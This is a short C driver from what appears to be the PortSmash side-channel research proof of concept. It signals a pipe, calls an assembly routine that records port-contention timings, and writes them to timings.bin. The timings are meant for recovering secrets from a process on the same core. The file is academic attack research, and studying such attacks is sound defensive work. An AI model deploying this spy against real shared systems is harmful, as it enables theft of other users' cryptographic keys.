/*
 *   Copyright 2018-2019 Alejandro Cabrera Aldaya, Billy Bob Brumley, Sohaib ul Hassan, Cesar Pereida García and Nicola Tuveri
 *
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

#include "spy.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <assert.h>

int main(int argc, char *argv[]) {

    size_t ret;
    /* pipe */
    uint8_t *zeroes = (uint8_t *)calloc(ZERO_COUNT, sizeof(uint8_t));
    FILE *pipe;
    pipe = fopen(SPY_PIPE, "wb+");
    assert(pipe != NULL);
    ret = fwrite(zeroes, sizeof(uint8_t), ZERO_COUNT, pipe);
    assert(ret == ZERO_COUNT);

    fclose(pipe);
    free(zeroes);

    /* spy */
    /* size_t ret; */
    ret = 0;
    uint64_t *timings = (uint64_t *)calloc(SPY_NUM_TIMINGS, sizeof(uint64_t));
    assert(timings != NULL);

    /* call function in assembler */
    x64_portsmash_spy(timings);

    /* open file */
    FILE *fp;
    fp = fopen("timings.bin", "wb+");
    assert(fp != NULL);

    ret = fwrite(timings, sizeof(uint64_t), SPY_NUM_TIMINGS, fp);
    assert(ret == SPY_NUM_TIMINGS);

    fclose(fp);
    free(timings);

    return 0;
}
